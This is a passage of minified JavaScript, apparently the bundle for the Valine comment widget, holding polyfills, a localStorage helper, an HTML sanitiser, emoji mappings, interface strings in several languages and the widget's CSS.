t=null!==e&&"object"==typeof e,n="[object Function]"===o.call(e),r=i(e),s=t&&"[object String]"===o.call(e),p=[];if(!t&&!n&&!r)throw new TypeError("Object.keys called on a non-object");var d=c&&n;if(s&&e.length>0&&!a.call(e,0))for(var g=0;g<e.length;++g)p.push(String(g));if(r&&e.length>0)for(var f=0;f<e.length;++f)p.push(String(f));else for(var m in e)d&&"prototype"===m||!a.call(e,m)||p.push(String(m));if(l)for(var v=h(e),b=0;b<u.length;++b)v&&"constructor"===u[b]||!a.call(e,u[b])||p.push(u[b]);return p}}e.exports=r},function(e,t,n){"use strict";var r=Array.prototype.slice,a=n(10),o=Object.keys,i=o?function(e){return o(e)}:n(39),s=Object.keys;i.shim=function(){return Object.keys?function(){var e=Object.keys(arguments);return e&&e.length===arguments.length}(1,2)||(Object.keys=function(e){return s(a(e)?r.call(e):e)}):Object.keys=i,Object.keys||i},e.exports=i},function(e,t){function n(){throw new Error("setTimeout has not been defined")}function r(){throw new Error("clearTimeout has not been defined")}function a(e){if(c===setTimeout)return setTimeout(e,0);if((c===n||!c)&&setTimeout)return c=setTimeout,setTimeout(e,0);try{return c(e,0)}catch(t){try{return c.call(null,e,0)}catch(t){return c.call(this,e,0)}}}function o(){h&&d&&(h=!1,d.length?g=d.concat(g):f=-1,g.length&&i())}function i(){if(!h){var e=a(o);h=!0;for(var t=g.length;t;){for(d=g,g=[];++f<t;)d&&d[f].run();f=-1,t=g.length}d=null,h=!1,function(e){if(u===clearTimeout)return clearTimeout(e);if((u===r||!u)&&clearTimeout)return u=clearTimeout,clearTimeout(e);try{u(e)}catch(t){try{return u.call(null,e)}catch(t){return u.call(this,e)}}}(e)}}function s(e,t){this.fun=e,this.array=t}function l(){}var c,u,p=e.exports={};!function(){try{c="function"==typeof setTimeout?setTimeout:n}catch(e){c=n}try{u="function"==typeof clearTimeout?clearTimeout:r}catch(e){u=r}}();var d,g=[],h=!1,f=-1;p.nextTick=function(e){var t=new Array(arguments.length-1);if(arguments.length>1)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];g.push(new s(e,t)),1!==g.length||h||a(i)},s.prototype.run=function(){this.fun.apply(null,this.array)},p.title="browser",p.browser=!0,p.env={},p.argv=[],p.version="",p.versions={},p.on=l,p.addListener=l,p.once=l,p.off=l,p.removeListener=l,p.removeAllListeners=l,p.emit=l,p.prependListener=l,p.prependOnceListener=l,p.listeners=function(e){return[]},p.binding=function(e){throw new Error("process.binding is not supported")},p.cwd=function(){return"/"},p.chdir=function(e){throw new Error("process.chdir is not supported")},p.umask=function(){return 0}},function(e,t,n){"use strict";function r(e){return e=JSON.stringify(e),!!/^\{[\s\S]*\}$/.test(e)}function a(e){if("string"==typeof e)try{return JSON.parse(e)}catch(t){return e}}function o(e){return"[object Function]"==={}.toString.call(e)}function i(e){return"[object Array]"===Object.prototype.toString.call(e)}function s(){if(!(this instanceof s))return new s}function l(e,t){var n=arguments,a=null;if(u||(u=s()),0===n.length)return u.get();if(1===n.length){if("string"==typeof e)return u.get(e);if(r(e))return u.set(e)}if(2===n.length&&"string"==typeof e){if(!t)return u.remove(e);if(t&&"string"==typeof t)return u.set(e,t);t&&o(t)&&(a=null,a=t(e,u.get(e)),l.set(e,a))}if(2===n.length&&i(e)&&o(t))for(var c=0,p=e.length;c<p;c++)a=t(e[c],u.get(e[c])),l.set(e[c],a);return l}Object.defineProperty(t,"__esModule",{value:!0});
/*!
 * storejs v1.0.24
 * Local storage localstorage package provides a simple API
 * 
 * Copyright (c) 2018 kenny wang <wowohoo@qq.com>
 * https://github.com/jaywcjlove/store.js
 * 
 * Licensed under the MIT license.
 */
var c=window.localStorage;c=function(e){var t="_Is_Incognit";try{e.setItem(t,"yes")}catch(t){if("QuotaExceededError"===t.name){var n=function(){};e.__proto__={setItem:n,getItem:n,removeItem:n,clear:n}}}finally{"yes"===e.getItem(t)&&e.removeItem(t)}return e}(c),s.prototype={set:function(e,t){if(e&&!r(e))c.setItem(e,function(e){return void 0===e||"function"==typeof e?e+"":JSON.stringify(e)}(t));else if(r(e))for(var n in e)this.set(n,e[n]);return this},get:function(e){if(!e){var t={};return this.forEach((function(e,n){return t[e]=n})),t}if("?"===e.charAt(0))return this.has(e.substr(1));var n=arguments;if(n.length>1){for(var r={},o=0,i=n.length;o<i;o++){var s=a(c.getItem(n[o]));s&&(r[n[o]]=s)}return r}return a(c.getItem(e))},clear:function(){return c.clear(),this},remove:function(e){var t=this.get(e);return c.removeItem(e),t},has:function(e){return{}.hasOwnProperty.call(this.get(),e)},keys:function(){var e=[];return this.forEach((function(t){e.push(t)})),e},forEach:function(e){for(var t=0,n=c.length;t<n;t++){var r=c.key(t);e(r,this.get(r))}return this},search:function(e){for(var t=this.keys(),n={},r=0,a=t.length;r<a;r++)t[r].indexOf(e)>-1&&(n[t[r]]=this.get(t[r]));return n}};var u=null;for(var p in s.prototype)l[p]=s.prototype[p];t.default=l},function(e,t,n){"use strict";var r=n(12),a=n(9),o=n(11),i=n(13),s=n(49),l=r(i());a(l,{getPolyfill:i,implementation:o,shim:s}),e.exports=l},function(e,t,n){"use strict";var r=n(1),a=r("%String%"),o=r("%TypeError%");e.exports=function(e){if("symbol"==typeof e)throw new o("Cannot convert a Symbol value to a string");return a(e)}},function(e,t,n){"use strict";var r=n(1)("%TypeError%");e.exports=function(e,t){if(null==e)throw new r(t||"Cannot call method on "+e);return e}},function(e,t,n){"use strict";var r=n(1),a=n(12),o=a(r("String.prototype.indexOf"));e.exports=function(e,t){var n=r(e,!!t);return"function"==typeof n&&o(e,".prototype.")?a(n):n}},function(e,t,n){"use strict";(function(t){var r=t.Symbol,a=n(48);e.exports=function(){return"function"==typeof r&&"function"==typeof Symbol&&"symbol"==typeof r("foo")&&"symbol"==typeof Symbol("bar")&&a()}}).call(t,n(14))},function(e,t,n){"use strict";e.exports=function(){if("function"!=typeof Symbol||"function"!=typeof Object.getOwnPropertySymbols)return!1;if("symbol"==typeof Symbol.iterator)return!0;var e={},t=Symbol("test"),n=Object(t);if("string"==typeof t)return!1;if("[object Symbol]"!==Object.prototype.toString.call(t))return!1;if("[object Symbol]"!==Object.prototype.toString.call(n))return!1;for(t in e[t]=42,e)return!1;if("function"==typeof Object.keys&&0!==Object.keys(e).length)return!1;if("function"==typeof Object.getOwnPropertyNames&&0!==Object.getOwnPropertyNames(e).length)return!1;var r=Object.getOwnPropertySymbols(e);if(1!==r.length||r[0]!==t)return!1;if(!Object.prototype.propertyIsEnumerable.call(e,t))return!1;if("function"==typeof Object.getOwnPropertyDescriptor){var a=Object.getOwnPropertyDescriptor(e,t);if(42!==a.value||!0!==a.enumerable)return!1}return!0}},function(e,t,n){"use strict";var r=n(9),a=n(13);e.exports=function(){var e=a();return r(String.prototype,{trim:e},{trim:function(){return String.prototype.trim!==e}}),e}},function(e,t,n){"use strict";(function(t){var n=function(){};if("production"!==t.env.NODE_ENV){var r=function(e,t){var n=arguments.length;t=new Array(n>1?n-1:0);for(var r=1;r<n;r++)t[r-1]=arguments[r];var a=0,o="Warning: "+e.replace(/%s/g,(function(){return t[a++]}));try{throw new Error(o)}catch(e){}};n=function(e,t,n){var a=arguments.length;n=new Array(a>2?a-2:0);for(var o=2;o<a;o++)n[o-2]=arguments[o];if(void 0===t)throw new Error("`warning(condition, format, ...args)` requires a warning message argument");e||r.apply(null,[t].concat(n))}}e.exports=n}).call(t,n(41))},function(e,t,n){function r(e,t){return new i(t).process(e)}var a=n(15),o=n(16),i=n(52);for(var s in(t=e.exports=r).filterXSS=r,t.FilterXSS=i,a)t[s]=a[s];for(var s in o)t[s]=o[s];"undefined"!=typeof window&&(window.filterXSS=e.exports),"undefined"!=typeof self&&"undefined"!=typeof DedicatedWorkerGlobalScope&&self instanceof DedicatedWorkerGlobalScope&&(self.filterXSS=e.exports)},function(e,t,n){function r(e){return null==e}function a(e){(e=function(e){var t={};for(var n in e)t[n]=e[n];return t}(e||{})).stripIgnoreTag&&(e.onIgnoreTag,e.onIgnoreTag=i.onIgnoreTagStripAll),e.whiteList=e.whiteList||i.whiteList,e.onTag=e.onTag||i.onTag,e.onTagAttr=e.onTagAttr||i.onTagAttr,e.onIgnoreTag=e.onIgnoreTag||i.onIgnoreTag,e.onIgnoreTagAttr=e.onIgnoreTagAttr||i.onIgnoreTagAttr,e.safeAttrValue=e.safeAttrValue||i.safeAttrValue,e.escapeHtml=e.escapeHtml||i.escapeHtml,this.options=e,!1===e.css?this.cssFilter=!1:(e.css=e.css||{},this.cssFilter=new o(e.css))}var o=n(3).FilterCSS,i=n(15),s=n(16),l=s.parseTag,c=s.parseAttr,u=n(5);a.prototype.process=function(e){if(!(e=(e=e||"").toString()))return"";var t=this.options,n=t.whiteList,a=t.onTag,o=t.onIgnoreTag,s=t.onTagAttr,p=t.onIgnoreTagAttr,d=t.safeAttrValue,g=t.escapeHtml,h=this.cssFilter;t.stripBlankChar&&(e=i.stripBlankChar(e)),t.allowCommentTag||(e=i.stripCommentTag(e));var f=!1;t.stripIgnoreTagBody&&(f=i.StripTagBody(t.stripIgnoreTagBody,o),o=f.onIgnoreTag);var m=l(e,(function(e,t,i,l,f){var m,v={sourcePosition:e,position:t,isClosing:f,isWhite:n.hasOwnProperty(i)};if(!r(m=a(i,l,v)))return m;if(v.isWhite){if(v.isClosing)return"</"+i+">";var b=function(e){var t=u.spaceIndex(e);if(-1===t)return{html:"",closing:"/"===e[e.length-2]};var n="/"===(e=u.trim(e.slice(t+1,-1)))[e.length-1];return n&&(e=u.trim(e.slice(0,-1))),{html:e,closing:n}}(l),y=n[i],x=c(b.html,(function(e,t){var n,a=-1!==u.indexOf(y,e);return r(n=s(i,e,t,a))?a?(t=d(i,e,t,h))?e+'="'+t+'"':e:r(n=p(i,e,t,a))?void 0:n:n}));return l="<"+i,x&&(l+=" "+x),b.closing&&(l+=" /"),l+">"}return r(m=o(i,l,v))?g(l):m}),g);return f&&(m=f.remove(m)),m},e.exports=a},function(e,t){e.exports={smile:"e3/2018new_weixioa02_org.png",lovely:"09/2018new_keai_org.png",happy:"1e/2018new_taikaixin_org.png",clap:"6e/2018new_guzhang_thumb.png",whee:"33/2018new_xixi_thumb.png",haha:"8f/2018new_haha_thumb.png","laugh and cry":"4a/2018new_xiaoku_thumb.png",wink:"43/2018new_jiyan_org.png",greddy:"fa/2018new_chanzui_org.png",awkward:"a3/2018new_heixian_thumb.png",sweat:"28/2018new_han_org.png","pick nose":"9a/2018new_wabi_thumb.png",hum:"7c/2018new_heng_thumb.png",angry:"f6/2018new_nu_thumb.png",grievance:"a5/2018new_weiqu_thumb.png",poor:"96/2018new_kelian_org.png",disappoint:"aa/2018new_shiwang_thumb.png",sad:"ee/2018new_beishang_org.png",tear:"6e/2018new_leimu_org.png","no way":"83/2018new_kuxiao_org.png",shy:"c1/2018new_haixiu_org.png",dirt:"10/2018new_wu_thumb.png","love you":"f6/2018new_aini_org.png",kiss:"2c/2018new_qinqin_thumb.png",amorousness:"9d/2018new_huaxin_org.png",longing:"c9/2018new_chongjing_org.png",desire:"3e/2018new_tianping_thumb.png","bad laugh":"4d/2018new_huaixiao_org.png",blackness:"9e/2018new_yinxian_org.png","laugh without word":"2d/2018new_xiaoerbuyu_org.png",titter:"71/2018new_touxiao_org.png",cool:"c4/2018new_ku_org.png","not easy":"aa/2018new_bingbujiandan_thumb.png",think:"30/2018new_sikao_org.png",question:"b8/2018new_ningwen_org.png","no idea":"2a/2018new_wenhao_thumb.png",dizzy:"07/2018new_yun_thumb.png",bomb:"a2/2018new_shuai_thumb.png",bone:"a1/2018new_kulou_thumb.png","be quiet":"b0/2018new_xu_org.png","shut up":"62/2018new_bizui_org.png",stupid:"dd/2018new_shayan_org.png","surprise ":"49/2018new_chijing_org.png",vomit:"08/2018new_tu_org.png",cold:"40/2018new_kouzhao_thumb.png",sick:"3b/2018new_shengbing_thumb.png",bye:"fd/2018new_baibai_thumb.png","look down on":"da/2018new_bishi_org.png","white eye":"ef/2018new_landelini_org.png","left hum":"43/2018new_zuohengheng_thumb.png","right hum":"c1/2018new_youhengheng_thumb.png",crazy:"17/2018new_zhuakuang_org.png","scold ":"87/2018new_zhouma_thumb.png","hit on face":"cb/2018new_dalian_org.png",wow:"ae/2018new_ding_org.png",fan:"86/2018new_hufen02_org.png",money:"a2/2018new_qian_thumb.png",yawn:"55/2018new_dahaqian_org.png",sleepy:"3c/2018new_kun_thumb.png",sleep:"e2/2018new_shuijiao_thumb.png","watermelon ":"01/2018new_chigua_thumb.png",doge:"a1/2018new_doge02_org.png",dog:"22/2018new_erha_org.png",cat:"7b/2018new_miaomiao_thumb.png",thumb:"e6/2018new_zan_org.png",good:"8a/2018new_good_org.png",ok:"45/2018new_ok_org.png",yeah:"29/2018new_ye_thumb.png","shack hand":"e9/2018new_woshou_thumb.png",bow:"e7/2018new_zuoyi_org.png",come:"42/2018new_guolai_thumb.png",punch:"86/2018new_quantou_thumb.png"}},function(e,t){e.exports={nick:"NickName",mail:"E-Mail",link:"Website(http://)",nickFail:"NickName cannot be less than 3 bytes.",mailFail:"Please confirm your email address.",sofa:"No comment yet.",submit:"Submit",reply:"Reply",cancelReply:"Cancel reply",comments:"Comments",cancel:"Cancel",confirm:"Confirm",continue:"Continue",more:"Load More...",preview:"Preview",emoji:"Emoji",expand:"See more....",seconds:"seconds ago",minutes:"minutes ago",hours:"hours ago",days:"days ago",now:"just now",uploading:"Uploading ...",uploadDone:"Upload completed!",busy:"Submit is busy, please wait...","code-98":"Valine initialization failed, please check your version of av-min.js.","code-99":"Valine initialization failed, Please check the `el` element in the init method.","code-100":"Valine initialization failed, Please check your appId and appKey.","code-140":"The total number of API calls today has exceeded the development version limit.","code-401":"Unauthorized operation, Please check your appId and appKey.","code-403":"Access denied by API domain white list, Please check your security domain."}},function(e,t){e.exports={nick:"ニックネーム",mail:"メールアドレス",link:"サイト(http://)",nickFail:"3バイト以上のニックネームをご入力ください.",mailFail:"メールアドレスをご確認ください.",sofa:"コメントしましょう~",submit:"提出する",reply:"返信する",cancelReply:"キャンセル",comments:"コメント",cancel:"キャンセル",confirm:"確認する",continue:"继续",more:"さらに読み込む...",preview:"プレビュー",emoji:"絵文字",expand:"もっと見る",seconds:"秒前",minutes:"分前",hours:"時間前",days:"日前",now:"たっだ今",uploading:"アップロード中...",uploadDone:"アップロードが完了しました!",busy:"20 秒間隔で提出してください    ...","code-98":"ロードエラーです。av-min.js のバージョンを確認してください.","code-99":"ロードエラーです。initにある`el`エレメントを確認ください.","code-100":"ロードエラーです。AppIdとAppKeyを確認ください.","code-140":"今日のAPIコールの総数が開発バージョンの上限を超えた.","code-401":"権限が制限されています。AppIdとAppKeyを確認ください.","code-403":"アクセスがAPIなどに制限されました、ドメイン名のセキュリティ設定を確認ください"}},function(e,t){e.exports={nick:"昵称",mail:"邮箱",link:"网址(http://)",nickFail:"昵称不能少于3个字符",mailFail:"请填写正确的邮件地址",sofa:"来发评论吧~",submit:"提交",reply:"回复",cancelReply:"取消回复",comments:"评论",cancel:"取消",confirm:"确认",continue:"继续",more:"加载更多...",preview:"预览",emoji:"表情",expand:"查看更多...",seconds:"秒前",minutes:"分钟前",hours:"小时前",days:"天前",now:"刚刚",uploading:"正在传输...",uploadDone:"传输完成!",busy:"操作频繁，请稍候再试...","code-98":"Valine 初始化失败，请检查 av-min.js 版本","code-99":"Valine 初始化失败，请检查init中的`el`元素.","code-100":"Valine 初始化失败，请检查你的AppId和AppKey.","code-140":"今日 API 调用总次数已超过开发版限制.","code-401":"未经授权的操作，请检查你的AppId和AppKey.","code-403":"访问被API域名白名单拒绝，请检查你的安全域名设置."}},function(e,t){e.exports={nick:"暱稱",mail:"郵箱",link:"網址(http://)",nickFail:"昵稱不能少於3個字符",mailFail:"請填寫正確的郵件地址",sofa:"來發評論吧~",submit:"提交",reply:"回覆",cancelReply:"取消回覆",comments:"評論",cancel:"取消",confirm:"確認",continue:"繼續",more:"加載更多...",preview:"預覽",emoji:"表情",expand:"查看更多...",seconds:"秒前",minutes:"分鐘前",hours:"小時前",days:"天前",now:"剛剛",uploading:"正在上傳...",uploadDone:"上傳完成!",busy:"操作頻繁，請稍候再試...","code-98":"Valine 初始化失敗，請檢查 av-min.js 版本","code-99":"Valine 初始化失敗，請檢查init中的`el`元素.","code-100":"Valine 初始化失敗，請檢查你的AppId和AppKey.","code-140":"今日 API 調用總次數已超過開發版限制.","code-401":"未經授權的操作，請檢查你的AppId和AppKey.","code-403":"訪問被API域名白名單拒絕，請檢查你的安全域名設置."}},function(e,t,n){var r=n(59);"string"==typeof r&&(r=[[e.i,r,""]]);var a={transform:void 0};n(61)(r,a),r.locals&&(e.exports=r.locals)},function(e,t,n){(e.exports=n(60)(!1)).push([e.i,'.v[data-class=v]{font-size:16px;text-align:left}.v[data-class=v] *{-webkit-box-sizing:border-box;box-sizing:border-box;line-height:1.75}.v[data-class=v] .status-bar,.v[data-class=v] .veditor,.v[data-class=v] .vinput,.v[data-class=v] p,.v[data-class=v] pre code{color:#555}.v[data-class=v] .vsys,.v[data-class=v] .vtime{color:#b3b3b3}.v[data-class=v] .text-right{text-align:right}.v[data-class=v] .text-center{text-align:center}.v[data-class=v] img{max-width:100%;border:none}.v[data-class=v] hr{margin:.825em 0;border-color:#f6f6f6;border-style:dashed}.v[data-class=v].hide-avatar .vimg{display:none}.v[data-class=v] a{position:relative;cursor:pointer;color:#1abc9c;text-decoration:none;display:inline-block}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] code,.v[data-class=v] pre{background-color:#f8f8f8;padding:.2em .4em;border-radius:3px;font-size:85%;margin:0}.v[data-class=v] pre{padding:10px;overflow:auto;line-height:1.45}.v[data-class=v] pre code{padding:0;background:transparent;white-space:pre-wrap;word-break:keep-all}.v[data-class=v] blockquote{color:#666;margin:.5em 0;padding:0 0 0 1em;border-left:8px solid hsla(0,0%,93%,.5)}.v[data-class=v] .vinput{border:none;resize:none;outline:none;padding:10px 5px;max-width:100%;font-size:.775em}.v[data-class=v] input[type=checkbox],.v[data-class=v] input[type=radio]{display:inline-block;vertical-align:middle;margin-top:-2px}.v[data-class=v] .vicon{cursor:pointer;display:inline-block;overflow:hidden;fill:#555;vertical-align:middle}.v[data-class=v] .vicon+.vicon{margin-left:10px}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vrow{font-size:0;padding:10px 0}.v[data-class=v] .vrow .vcol{display:inline-block;vertical-align:middle;font-size:14px}.v[data-class=v] .vrow .vcol.vcol-20{width:20%}.v[data-class=v] .vrow .vcol.vcol-30{width:30%}.v[data-class=v] .vrow .vcol.vcol-40{width:40%}.v[data-class=v] .vrow .vcol.vcol-50{width:50%}.v[data-class=v] .vrow .vcol.vcol-60{width:60%}.v[data-class=v] .vrow .vcol.vcol-70{width:70%}.v[data-class=v] .vrow .vcol.vcol-80{width:80%}.v[data-class=v] .vrow .vcol.vctrl{font-size:12px}.v[data-class=v] .emoji,.v[data-class=v] .vemoji{max-width:25px;vertical-align:middle;margin:0 1px;display:inline-block}.v[data-class=v] .vwrap{border:1px solid #f0f0f0;border-radius:4px;margin-bottom:10px;overflow:hidden;position:relative;padding:10px}.v[data-class=v] .vwrap input{background:transparent}.v[data-class=v] .vwrap .vedit{position:relative;padding-top:10px}.v[data-class=v] .vwrap .cancel-reply-btn{position:absolute;right:5px;top:5px;cursor:pointer}.v[data-class=v] .vwrap .vemojis{display:none;font-size:18px;max-height:145px;overflow:auto;padding-bottom:10px;-webkit-box-shadow:0 0 1px #f0f0f0;box-shadow:0 0 1px #f0f0f0}.v[data-class=v] .vwrap .vemojis i{font-style:normal;padding-top:7px;width:36px;cursor:pointer;text-align:center;display:inline-block;vertical-align:middle}.v[data-class=v] .vwrap .vpreview{padding:7px;-webkit-box-shadow:0 0 1px #f0f0f0;box-shadow:0 0 1px #f0f0f0}.v[data-class=v] .vwrap .vheader .vinput{width:33.33%;border-bottom:1px dashed #dedede}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:50%}.v[data-class=v] .vwrap .vheader.item1 .vinput{width:100%}.v[data-class=v] .vwrap .vheader .vinput:focus{border-bottom-color:#eb5055}@media screen and (max-width:520px){.v[data-class=v] .vwrap .vheader.item2 .vinput,.v[data-class=v] .vwrap .vheader .vinput{width:100%}}.v[data-class=v] .vpower{color:#999;font-size:.75em;padding:.5em 0}.v[data-class=v] .vpower a{font-size:.75em}.v[data-class=v] .vcount{padding:5px;font-weight:600;font-size:1.25em}.v[data-class=v] ol,.v[data-class=v] ul{padding:0;margin-left:1.25em}.v[data-class=v] .txt-center{text-align:center}.v[data-class=v] .txt-right{text-align:right}.v[data-class=v] .pd5{padding:5px}.v[data-class=v] .pd10{padding:10px}.v[data-class=v] .veditor{width:100%;min-height:8.75em;font-size:.875em;background:transparent;resize:vertical;-webkit-transition:all .25s ease;transition:all .25s ease}.v[data-class=v] .vbtn{-webkit-transition-duration:.4s;transition-duration:.4s;text-align:center;color:#555;border:1px solid #ededed;border-radius:.3em;display:inline-block;background:transparent;margin-bottom:0;font-weight:400;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;white-space:nowrap;padding:.5em 1.25em;font-size:.875em;line-height:1.42857143;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;outline:none}.v[data-class=v] .vbtn+.vbtn{margin-left:1.25em}.v[data-class=v] .vbtn:active,.v[data-class=v] .vbtn:hover{color:#3090e4;border-color:#3090e4}.v[data-class=v] .vbtn:disabled{border-color:#e1e1e1;color:#e1e1e1;background-color:#fdfafa;cursor:not-allowed}.v[data-class=v] .vempty{padding:1.25em;text-align:center;color:#555;overflow:auto}.v[data-class=v] .vsys{display:inline-block;padding:.2em .5em;font-size:.75em;border-radius:.2em;margin-right:.3em}@media screen and (max-width:520px){.v[data-class=v] .vsys{display:none}}.v[data-class=v] .vcards{width:100%}.v[data-class=v] .vcards .vcard{padding-top:1.25em;position:relative;display:block}.v[data-class=v] .vcards .vcard:after{content:"";clear:both;display:block}.v[data-class=v] .vcards .vcard .vimg{width:3.125em;height:3.125em;float:left;border-radius:50%;margin-right:.7525em;border:1px solid #f5f5f5;padding:.125em}@media screen and (max-width:720px){.v[data-class=v] .vcards .vcard .vimg{width:2.5em;height:2.5em}}.v[data-class=v] .vcards .vcard .vhead{line-height:1.5;margin-top:0}.v[data-class=v] .vcards .vcard .vhead .vnick{position:relative;font-size:.875em;font-weight:500;margin-right:.875em;cursor:pointer;text-decoration:none;display:inline-block}.v[data-class=v] .vcards .vcard .vhead .vnick:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vh{overflow:hidden;padding-bottom:.5em;border-bottom:1px dashed #f5f5f5}.v[data-class=v] .vcards .vcard .vh .vtime{font-size:.75em;margin-right:.875em}.v[data-class=v] .vcards .vcard .vh .vmeta{line-height:1;position:relative}.v[data-class=v] .vcards .vcard .vh .vmeta .vat{font-size:.8125em;color:#ef2f11;cursor:pointer;float:right}.v[data-class=v] .vcards .vcard:last-child .vh{border-bottom:none}.v[data-class=v] .vcards .vcard .vcontent{word-wrap:break-word;word-break:break-all;font-size:.875em;line-height:2;position:relative;margin-bottom:.75em;padding-top:.625em}.v[data-class=v] .vcards .vcard .vcontent.expand{cursor:pointer;max-height:8em;overflow:hidden}.v[data-class=v] .vcards .vcard .vcontent.expand:before{display:block;content:"";position:absolute;width:100%;left:0;top:0;bottom:3.15em;background:-webkit-gradient(linear,left top,left bottom,from(hsla(0,0%,100%,0)),to(hsla(0,0%,100%,.9)));background:linear-gradient(180deg,hsla(0,0%,100%,0),hsla(0,0%,100%,.9));z-index:999}.v[data-class=v] .vcards .vcard .vcontent.expand:after{display:block;content:attr(data-expand);text-align:center;color:#828586;position:absolute;width:100%;height:3.15em;line-height:3.15em;left:0;bottom:0;z-index:999;background:hsla(0,0%,100%,.9)}.v[data-class=v] .vcards .vcard .vquote{padding-left:1em;border-left:1px dashed hsla(0,0%,93%,.5)}.v[data-class=v] .vcards .vcard .vquote .vimg{width:2.225em;height:2.225em}.v[data-class=v] .vpage .vmore{margin:1em 0}.v[data-class=v] .clear{content:"";display:block;clear:both}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes pulse{50%{background:#dcdcdc}}@keyframes pulse{50%{background:#dcdcdc}}.v[data-class=v] .vspinner{width:22px;height:22px;display:inline-block;border:6px double #a0a0a0;border-top-color:transparent;border-bottom-color:transparent;border-radius:50%;-webkit-animation:spin 1s infinite linear;animation:spin 1s infinite linear;position:relative;vertical-align:middle;margin:0 5px}.dark .v[data-class=v] .status-bar,.dark .v[data-class=v] .veditor,.dark .v[data-class=v] .vinput,.dark .v[data-class=v] p,.dark .v[data-class=v] pre code,.night .v[data-class=v] .status-bar,.night .v[data-class=v] .veditor,.night .v[data-class=v] .vinput,.night .v[data-class=v] p,.night .v[data-class=v] pre code,.theme__dark .v[data-class=v] .status-bar,.theme__dark .v[data-class=v] .veditor,.theme__dark .v[data-class=v] .vinput,.theme__dark .v[data-class=v] p,.theme__dark .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] .status-bar,[data-theme=dark] .v[data-class=v] .veditor,[data-theme=dark] .v[data-class=v] .vinput,[data-theme=dark] .v[data-class=v] p,[data-theme=dark] .v[data-class=v] pre code{color:#b2b2b5}.dark .v[data-class=v] .vsys,.dark .v[data-class=v] .vtime,.night .v[data-class=v] .vsys,.night .v[data-class=v] .vtime,.theme__dark .v[data-class=v] .vsys,.theme__dark .v[data-class=v] .vtime,[data-theme=dark] .v[data-class=v] .vsys,[data-theme=dark] .v[data-class=v] .vtime{color:#929298}.dark .v[data-class=v] code,.dark .v[data-class=v] pre,.dark .v[data-class=v] pre code,.night .v[data-class=v] code,.night .v[data-class=v] pre,.night .v[data-class=v] pre code,.theme__dark .v[data-class=v] code,.theme__dark .v[data-class=v] pre,.theme__dark .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] code,[data-theme=dark] .v[data-class=v] pre,[data-theme=dark] .v[data-class=v] pre code{color:#929298;background-color:#151414}.dark .v[data-class=v] .vwrap,.night .v[data-class=v] .vwrap,.theme__dark .v[data-class=v] .vwrap,[data-theme=dark] .v[data-class=v] .vwrap{border-color:#b2b2b5}.dark .v[data-class=v] .vicon,.night .v[data-class=v] .vicon,.theme__dark .v[data-class=v] .vicon,[data-theme=dark] .v[data-class=v] .vicon{fill:#b2b2b5}.dark .v[data-class=v] .vicon.actived,.night .v[data-class=v] .vicon.actived,.theme__dark .v[data-class=v] .vicon.actived,[data-theme=dark] .v[data-class=v] .vicon.actived{fill:#66b1ff}.dark .v[data-class=v] .vbtn,.night .v[data-class=v] .vbtn,.theme__dark .v[data-class=v] .vbtn,[data-theme=dark] .v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.dark .v[data-class=v] .vbtn:hover,.night .v[data-class=v] .vbtn:hover,.theme__dark .v[data-class=v] .vbtn:hover,[data-theme=dark] .v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.dark .v[data-class=v] a:hover,.night .v[data-class=v] a:hover,.theme__dark .v[data-class=v] a:hover,[data-theme=dark] .v[data-class=v] a:hover{color:#d7191a}.dark .v[data-class=v] .vcards .vcard .vcontent.expand:before,.night .v[data-class=v] .vcards .vcard .vcontent.expand:before,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand:before,[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand:before{background:-webkit-gradient(linear,left top,left bottom,from(rgba(0,0,0,.3)),to(rgba(0,0,0,.7)));background:linear-gradient(180deg,rgba(0,0,0,.3),rgba(0,0,0,.7))}.dark .v[data-class=v] .vcards .vcard .vcontent.expand:after,.night .v[data-class=v] .vcards .vcard .vcontent.expand:after,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand:after,[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand:after{background:rgba(0,0,0,.7)}@media (prefers-color-scheme:dark){.v[data-class=v] .status-bar,.v[data-class=v] .veditor,.v[data-class=v] .vinput,.v[data-class=v] p,.v[data-class=v] pre code{color:#b2b2b5}.v[data-class=v] .vsys,.v[data-class=v] .vtime{color:#929298}.v[data-class=v] code,.v[data-class=v] pre,.v[data-class=v] pre code{color:#929298;background-color:#151414}.v[data-class=v] .vwrap{border-color:#b2b2b5}.v[data-class=v] .vicon{fill:#b2b2b5}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vcontent.expand:before{background:-webkit-gradient(linear,left top,left bottom,from(rgba(0,0,0,.3)),to(rgba(0,0,0,.7)));background:linear-gradient(180deg,rgba(0,0,0,.3),rgba(0,0,0,.7))}.v[data-class=v] .vcards .vcard .vcontent.expand:after{background:rgba(0,0,0,.7)}}',""])},function(e,t){function n(e,t){var n=e[1]||"",r=e[3];if(!r)return n;if(t&&"function"==typeof btoa){var a=function(e){return"/*# sourceMappingURL=data:application/json;charset=utf-8;base64,"+btoa(unescape(encodeURIComponent(JSON.stringify(e))))+" */"}(r);return[n].concat(r.sources.map((function(e){return"/*# sourceURL="+r.sourceRoot+e+" */"}))).concat([a]).join("\n")}return[n].join("\n")}e.exports=function(e){var t=[];return t.toString=function(){return this.map((function(t){var r=n(t,e);return t[2]?"@media 